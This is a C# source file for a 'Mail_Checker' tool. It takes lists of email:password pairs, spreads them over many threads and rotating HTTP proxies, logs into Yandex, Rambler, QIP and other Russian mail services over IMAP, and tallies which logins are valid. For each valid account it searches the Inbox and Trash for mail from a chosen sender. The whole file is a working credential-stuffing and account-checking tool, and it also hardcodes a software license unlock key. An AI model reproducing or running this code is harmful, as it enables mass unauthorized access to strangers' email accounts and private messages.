using System;
using System.Collections.Concurrent;
using System.Threading;
using Chilkat;
using System.IO;

namespace Mail_Checker
{

    class ProxyStats
    {
        public string proxy;
        public int stats;

        public ProxyStats(string proxy, int stats)
        {
            this.proxy = proxy;
            this.stats = stats;
        }
    }


    class Checker
    {

        public EventHandler<CheckEventArgs> OneCheckDone;

        char[] separs = { ':', ';' };
        ConcurrentQueue<string> mails;
        ConcurrentQueue<ProxyStats> proxys;
        //string serv = "imap.yandex.ru";
        string query;

        int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
        int threads, timeout;
        bool started = false;

        public Checker(string[] mails, string[] proxys, string query, int threads, int timeout)
        {
            this.mails = new ConcurrentQueue<string>(mails);

            this.proxys = new ConcurrentQueue<ProxyStats>();

            for (int i = 0; i < proxys.Length; i++)
            {
                this.proxys.Enqueue(new ProxyStats(proxys[i], 3));
            }
            

            this.query = query;
            this.threads = threads;
            this.timeout = timeout;
            
        }


        public void Start()
        {
            started = true;


            ThreadPool.SetMaxThreads(threads * 2, threads * 20);
            ThreadPool.SetMinThreads(threads, threads * 10);


            for (int i = 0; i < threads; i++)
            {
                ThreadPool.QueueUserWorkItem(new WaitCallback(Check));
            }
        }

        public void Stop()
        {
            started = false;
        }




        void Check(object e)
        {

            workingThreads++;



            while (mails.Count > 0 && proxys.Count > 0 && started)
            {
                int mailType = 0;

                string mailLine;
                mails.TryDequeue(out mailLine);
                string[] mailElements = mailLine.Split(separs);

                string serv = "";
                if (mailElements[0].Contains("@yandex.ru")) serv = "imap.yandex.ru";
                else if (mailElements[0].Contains("@rambler.ru")) serv = "imap.rambler.ru";

                else if (mailElements[0].Contains("@qip.ru") || mailElements[0].Contains("@pochta.ru") ||
                    mailElements[0].Contains("@fromru.com") || mailElements[0].Contains("@front.ru") ||
                    mailElements[0].Contains("@hotbox.ru") || mailElements[0].Contains("@hotmail.ru") ||
                    mailElements[0].Contains("@krovatka.su") || mailElements[0].Contains("@land.ru") ||
                    mailElements[0].Contains("@mail15.com") || mailElements[0].Contains("@mail333.com") ||
                    mailElements[0].Contains("@newmail.ru") || mailElements[0].Contains("@nightmail.ru") ||
                    mailElements[0].Contains("@nm.ru") || mailElements[0].Contains("@pisem.net") ||
                    mailElements[0].Contains("@pochtamt.ru") || mailElements[0].Contains("@pop3.ru") ||
                    mailElements[0].Contains("@rbcmail.ru") || mailElements[0].Contains("@smtp.ru") ||
                    mailElements[0].Contains("@5ballov.ru") || mailElements[0].Contains("@aeterna.ru") ||
                    mailElements[0].Contains("@ziza.ru") || mailElements[0].Contains("@memori.ru") ||
                    mailElements[0].Contains("@photofile.ru") || mailElements[0].Contains("@fotoplenka.ru") ||
                    mailElements[0].Contains("@pochta.com")) serv = "imap.qip.ru";

                //else if (mailElements[0].Contains("@mail.ru") || mailElements[0].Contains("@list.ru") 
                //    || mailElements[0].Contains("@inbox.ru") || mailElements[0].Contains("@bk.ru")) mailType = 1;

                else continue;

                ProxyStats proxyLine;
                proxys.TryDequeue(out proxyLine);
                string[] proxyElements = proxyLine.proxy.Split(separs);

                int messNum=0;
                CheckErrors error = CheckErrors.noError;

                if (mailType==0) ImapMailsCheck(mailElements, serv, proxyElements, out messNum, out error);
                else if (mailType == 1) MailRuCheck(mailElements, proxyElements, out messNum, out error);


                if (error == CheckErrors.proxyError)
                {
                    errors++;
                    mails.Enqueue(mailLine);
                    proxyLine.stats--;
                    if (proxyLine.stats > 0) proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.noError)
                {
                    valid++;
                    proxyLine.stats++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.mailError)
                {
                    novalid++;
                    proxyLine.stats++;
                    proxys.Enqueue(proxyLine);
                }
                else if (error == CheckErrors.connectError)
                {
                    errors++;
                    mails.Enqueue(mailLine);
                    proxys.Enqueue(proxyLine);
                }



                MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messNum);
                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));



            }

            

            workingThreads--;

        }

        private void MailRuCheck(string[] mailElements, string[] proxyElements, out int messNum, out CheckErrors error)
        {
            throw new NotImplementedException();
        }

        private void ImapMailsCheck(string[] mailElements, string serv, string[] proxyElements, out int messNum, out CheckErrors error)
        {
            bool success = true;
            messNum = 0;
            error = CheckErrors.noError;


            Imap imap = new Imap();
            imap.ConnectTimeout = timeout;
            imap.ReadTimeout = timeout;
            imap.Ssl = true;
            imap.Port = 993;
            imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");


            imap.HttpProxyHostname = proxyElements[0];
            try
            {
                imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);
            }
            catch (FormatException)
            {
                success = false;
                error = CheckErrors.proxyError;
            }

            if (success == true)
            {
                success = imap.Connect(serv);
            }
            else if (error == CheckErrors.noError) error = CheckErrors.proxyError;


            if (success == true)
            {
                success = imap.Login(mailElements[0], mailElements[1]);
            }
            else if (error == CheckErrors.noError) error = CheckErrors.proxyError;

            if (success == true)
            {
                success = imap.SelectMailbox("Inbox");
            }
            else if (error == CheckErrors.noError) error = CheckErrors.mailError;


            if (success == true)
            {
                MessageSet messageSet = imap.Search("FROM " + query, false);
                if (messageSet != null) messNum += messageSet.Count;
            }
            else if (error == CheckErrors.noError) error = CheckErrors.connectError;


            if (success == true)
            {
                success = imap.SelectMailbox("Trash");
            }
            else if (error == CheckErrors.noError) error = CheckErrors.connectError;

            if (success == true)
            {
                MessageSet messageSet = imap.Search("FROM " + query, false);
                if (messageSet != null) messNum += messageSet.Count;
            }
            else if (error == CheckErrors.noError) error = CheckErrors.connectError;


            imap.Disconnect();
            imap.Dispose();
        }


        


    }
}
